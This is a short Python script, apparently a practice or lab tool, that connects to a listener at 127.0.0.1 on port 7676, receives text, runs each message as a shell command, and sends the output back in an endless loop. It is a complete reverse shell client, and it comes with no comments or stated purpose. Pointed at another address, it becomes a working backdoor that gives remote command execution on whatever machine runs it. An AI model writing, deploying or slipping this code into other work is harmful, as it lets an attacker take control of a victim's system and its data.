import socket
import subprocess
import sys


def main():
    ip = '127.0.0.1'
    port = 7676

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    while True:
        data = s.recv(1024).decode('utf-8')

        command = subprocess.Popen(data, shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
        STDOUT, STDERR = command.communicate()
        if STDOUT == b'':
            STDOUT = b'\n'
        s.send(STDOUT.decode(sys.getfilesystemencoding()).encode('utf-8'))

    s.close()


if __name__ == '__main__':
    main()
